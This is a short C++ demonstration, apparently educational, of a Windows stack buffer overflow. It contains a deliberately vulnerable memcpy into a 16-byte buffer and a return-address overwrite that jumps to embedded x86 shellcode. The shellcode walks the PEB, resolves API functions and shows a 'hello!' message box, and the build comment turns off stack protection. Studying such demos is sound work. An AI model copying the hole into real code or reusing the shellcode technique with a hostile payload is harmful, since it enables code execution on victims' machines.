// from shellcode.cpp ( https://github.com/i-saint/scribble/blob/master/shellcode.cpp )
#pragma section(".shellcode", execute)
__declspec(allocate(".shellcode")) char shellcode[] = "\x55\x8B\xEC\x83\xEC\x38\x53\x56\x57\xC7\x45\xD4\x75\x73\x65\x72\xC7\x45\xD8\x33\x32\x2E\x64\xC7\x45\xDC\x6C\x6C\x00\x00\xC7\x45\xC8\x4D\x65\x73\x73\xC7\x45\xCC\x61\x67\x65\x42\xC7\x45\xD0\x6F\x78\x41\x00\xC7\x45\xE0\x68\x65\x6C\x6C\xC7\x45\xE4\x6F\x21\x00\x00\x33\xC9\x64\x8B\x35\x30\x00\x00\x00\x8B\x76\x0C\x8B\x76\x1C\x8B\x46\x08\x8B\x7E\x20\x8B\x36\x38\x4F\x18\x75\xF3\x89\x45\xF8\x8B\x55\xF8\x8B\x42\x3C\x8B\x44\x10\x78\x83\x65\xFC\x00\x03\xC2\x8B\x70\x20\x8B\x78\x24\x8B\x58\x1C\x8B\x40\x14\x03\xF2\x03\xFA\x03\xDA\x89\x45\xF0\x85\xC0\x74\x50\x8B\x45\xFC\x8B\x0C\x86\x0F\xB7\x04\x47\x8B\x04\x83\x03\xC2\x89\x45\xF4\x8B\x04\x11\x3D\x4C\x6F\x61\x64\x75\x12\x81\x7C\x11\x08\x61\x72\x79\x41\x75\x08\x8B\x45\xF4\x89\x45\xEC\xEB\x17\x3D\x47\x65\x74\x50\x75\x10\x81\x7C\x11\x08\x64\x64\x72\x65\x75\x06\x8B\x45\xF4\x89\x45\xE8\xFF\x45\xFC\x8B\x45\xFC\x3B\x45\xF0\x72\xB0\x8D\x45\xD4\x50\xFF\x55\xEC\x8D\x4D\xC8\x51\x50\xFF\x55\xE8\x6A\x00\x8D\x4D\xE0\x51\x51\x6A\x00\xFF\xD0\x5F\x5E\x5B\xC9\xC3";

#include <cstring>
void vulnerable(char *data, size_t size)
{
    char buf[0x10];
    memcpy(buf, data, size);
}

int main()
{
    char data[0x18];
    *(void**)(&data[0x14]) = shellcode; // return address を shellcode に書き換える
    vulnerable(data, sizeof(data)); // main() -> vulnerable() -> shellcode
}
// $ cl /Zi /GS- buffer_overflow.cpp && ./buffer_overflow
